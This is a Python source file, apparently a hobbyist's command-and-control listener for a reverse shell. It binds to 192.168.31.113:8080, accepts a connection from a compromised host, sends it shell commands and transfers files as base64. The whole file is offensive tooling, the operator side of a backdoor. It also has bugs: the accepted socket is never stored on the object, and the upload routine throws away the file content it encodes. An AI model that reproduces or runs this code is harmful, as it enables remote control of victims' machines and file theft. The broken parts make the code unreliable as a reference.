import socket
import simplejson
import base64

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("listening")
        (my_connect,my_addr) = listener.accept()
        print("connected from " + str(my_addr))

    def json_send(self,data):
        json_data = simplejson.dumps(data)
        self.my_connect.send(json_data.encode("utf-8"))
    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connect.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def command(self,enter_command):
        self.json_send(enter_command)
        if enter_command[0] == "quit":
            self.my_connect.close()
            exit()
        return self.json_recv()

    def save_file(self,file,content):
        with open(file,"wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download successful"
    def get_file(self,file):
        with open(file,"rb") as my_file:
            base64.b64encode(my_file.read())
            return "Upload successful"


    def start_listener(self):
        while True:
            enter_command = input("Enter command :")
            enter_command = enter_command.split(" ")  # Bu split icine ne qoysaq o stringi ona gore bolur .
            try:
                if enter_command[0] == "upload":
                    my_content_file = self.get_file(enter_command[1])
                    enter_command.append(my_content_file)

                command_output = self.command(enter_command)

                if enter_command[0] == "download":
                    command_output = self.save_file(enter_command[1],command_output)
            except Exception:
                command_output = "Error.."

            print(command_output)

my_listener = Listener("192.168.31.113",8080)
my_listener.start_listener()





